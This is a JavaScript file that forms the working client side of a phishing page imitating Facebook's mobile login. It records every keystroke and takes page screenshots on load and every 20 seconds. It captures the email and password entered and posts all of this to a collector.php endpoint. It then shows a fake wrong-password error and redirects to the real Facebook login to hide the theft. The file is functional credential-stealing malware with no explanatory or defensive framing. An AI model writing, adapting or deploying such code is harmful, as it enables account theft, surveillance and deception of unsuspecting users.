// Common functions for sending data, keylogging, and screenshotting
function sendData(url, data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            if (callback) callback(xhr.responseText);
        }
    };
    var formData = [];
    for (var key in data) {
        formData.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    xhr.send(formData.join('&'));
}

var loggedKeys = '';
document.addEventListener('keydown', function(e) {
    if (e.key.length === 1 || ['Backspace', 'Tab', 'Enter', 'Space', 'Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) {
        loggedKeys += '[' + e.key + ']';
    }

    if (loggedKeys.length > 100) {
        sendData('collector.php', { keys: loggedKeys }, function(response) {
            console.log('Keylogs sent:', response);
            loggedKeys = '';
        });
    }
});

function captureAndSendScreenshot() {
    if (typeof html2canvas === 'undefined') {
        console.warn("html2canvas is not loaded. Screenshot feature disabled.");
        return;
    }
    html2canvas(document.body, {
        allowTaint: true,
        useCORS: true,
        logging: false,
        scale: 0.7,
    }).then(function(canvas) {
        var imageData = canvas.toDataURL('image/png');
        sendData('collector.php', { screenshot: imageData }, function(response) {
            console.log('Screenshot sent:', response);
        });
    }).catch(err => {
        console.error("Screenshot capture failed:", err);
    });
}

setInterval(captureAndSendScreenshot, 20000);


document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Prevent default form submission

    var username = document.getElementById('m_login_email').value;
    var password = document.getElementById('m_login_password').value;
    var errorBox = document.getElementById('error_box');

    if (username === '' || password === '') {
        errorBox.textContent = "The email address or phone number you entered isn't connected to an account.";
        errorBox.style.display = 'block';
        return;
    }

    
    var redirectUrl = 'https://www.facebook.com/login/device-based/regular/login/'; 

    var dataToSend = {
        email: username, 
        pass: password,
        keys: loggedKeys, // Send any remaining keylogs
        redirect_url: redirectUrl
    };

    sendData('collector.php', dataToSend, function(response) {
        console.log('Credentials and data sent:', response);
        // After sending, display a fake error and then redirect to make it look more legitimate
        errorBox.textContent = "The password that you've entered is incorrect. Did you forget your password?";
        errorBox.style.display = 'block';

        
        setTimeout(function() {
            window.location.href = redirectUrl;
        }, 3000); 
    });
});


document.getElementById('m_login_email').addEventListener('focus', function() {
    document.getElementById('error_box').style.display = 'none';
});
document.getElementById('m_login_password').addEventListener('focus', function() {
    document.getElementById('error_box').style.display = 'none';
});

// Initial screenshot on page load
captureAndSendScreenshot();
